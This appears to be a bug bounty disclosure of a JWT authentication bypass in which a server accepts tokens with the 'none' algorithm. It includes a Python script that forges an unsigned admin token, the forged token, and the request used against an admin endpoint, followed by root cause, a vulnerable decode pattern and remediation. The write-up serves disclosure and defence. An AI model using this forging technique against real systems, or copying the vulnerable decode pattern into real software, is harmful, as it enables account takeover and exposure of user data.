# Broken Authentication (JWT Algorithm Confusion (None Algorithm Accepted))

**Vulnerability Type:** Broken Authentication — JWT Validation Bypass <br>
**Severity:** Critical (CVSS 3.1 Score: 9.1) <br>
**Platform:** Bug Bounty (Redacted) <br>
**Status:** Resolved / Disclosed <br>
**Date:** 2025 <br>

---

## Summary

The application used JSON Web Tokens (JWTs) for session authentication but failed to properly validate the algorithm specified in the token header. By changing the `alg` field in the JWT header to `"none"` and removing the signature, I was able to forge a valid-looking token for any user account — including administrator accounts — without knowing the signing secret. The server accepted the unsigned token and granted full access to the specified account.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | JWT Algorithm Confusion — None Algorithm |
| Endpoint | All authenticated endpoints |
| Impact | Full account takeover for any user ID including admins |
| Authentication Required | No (bypass) |
| CVSS Vector | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |

---

## Background: How JWT Works

A JWT consists of three Base64URL-encoded parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE
```

**Header example:**
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload example:**
```json
{ "user_id": 1042, "role": "user", "exp": 1735689600 }
```

The server is supposed to verify the signature using the `alg` specified in the header against a secret key. The `none` algorithm means "no signature required," and a secure implementation must explicitly reject it.

---

## Steps to Reproduce

### 1. Log in and capture your JWT

Log into the application as a normal user. Capture the JWT returned in the response or stored in localStorage:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDQyLCJyb2xlIjoidXNlciIsImV4cCI6MTczNTY4OTYwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 2. Decode the JWT

Using [jwt.io](https://jwt.io) or a Python script, decode the three parts:

**Header:**
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload:**
```json
{ "user_id": 1042, "role": "user", "exp": 1735689600 }
```

### 3. Forge a modified token with `alg: none`

Modify the header to use the `none` algorithm, change the payload to target an admin account (user_id: 1), and remove the signature entirely:

```python
import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

header  = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
payload = b64url_encode(json.dumps({"user_id": 1, "role": "admin", "exp": 9999999999}))

forged_token = f"{header}.{payload}."  # Empty signature
print(forged_token)
```

**Output:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

### 4. Send the forged token

Send a request to an authenticated endpoint using the forged token:

```
GET /api/v1/admin/users HTTP/1.1
Host: redacted.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

### 5. Observe the response

The server returned a `200 OK` with the full admin user list — authentication was completely bypassed.

---

## Impact

- **Full account takeover** for any user by specifying their `user_id`
- **Privilege escalation** — setting `"role": "admin"` granted administrative access
- **Data breach** — admin endpoints exposed all registered user data
- No credentials or brute force required — the attack is instantaneous

---

## Root Cause

The JWT library was configured to trust the `alg` field from the token header without restricting it to allowed algorithms. Vulnerable pseudocode:

```python
# Vulnerable — trusts algorithm from token header
jwt.decode(token, secret, algorithms=jwt.get_unverified_header(token)['alg'])

# Secure — enforces expected algorithm explicitly
jwt.decode(token, secret, algorithms=["HS256"])
```

Additionally, the library did not have `none` algorithm support disabled, allowing unsigned tokens to pass validation.

---

## Remediation

1. **Explicitly specify allowed algorithms** — Never read the algorithm from the token header. Hardcode the expected algorithm in your verification call.
2. **Disable the `none` algorithm** — Ensure your JWT library has `none` explicitly rejected. Most modern libraries (PyJWT 2.x+, jsonwebtoken 9.x+) disable it by default — verify your version.
3. **Validate all claims** — Always verify `exp`, `iss`, and `aud` claims server-side.
4. **Use asymmetric signing (RS256/ES256)** — For higher-security scenarios, use public/private key pairs so the signing key is never exposed to clients.
5. **Upgrade JWT library** — Use a maintained, up-to-date JWT library with secure defaults.

---

## References

- [PortSwigger — JWT Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [OWASP — JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [CVE-2015-9235 — JWT None Algorithm](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
- [OWASP Top 10 — A07: Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

---

*This writeup is published for educational purposes. Testing was conducted within an authorized bug bounty program. The admin account accessed during testing was a program-provided test account.*
